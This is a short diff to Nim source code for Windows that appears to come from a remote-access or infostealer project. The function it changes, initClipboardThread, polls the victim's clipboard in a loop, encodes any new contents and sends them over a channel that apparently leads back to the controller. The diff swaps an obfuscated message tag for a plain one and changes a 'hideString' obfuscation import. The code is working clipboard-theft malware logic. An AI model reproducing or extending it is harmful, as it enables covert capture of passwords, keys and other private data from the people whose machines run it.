@@ -18,8 +18,7 @@ from winim/inc/winbase import GlobalLock
 
 from ../flags import CLIPBOARD_THREAD_CHECK_INTERVAL
 
-from ../functions/hideString import e
-from ../functions/hideString import d
+import ../functions/hideString
 
 from ../channels import mainChannel
 
@@ -49,7 +48,7 @@ proc initClipboardThread*(): void {.thread.} =
     let (worked, clipboard) = GetClipboardText()
 
     if worked == true and clipboard != prevClipboard:
-      mainChannel.send (d e "c", encode clipboard)
+      mainChannel.send ("c", encode clipboard)
       prevClipboard = clipboard
 
     sleep(CLIPBOARD_THREAD_CHECK_INTERVAL)
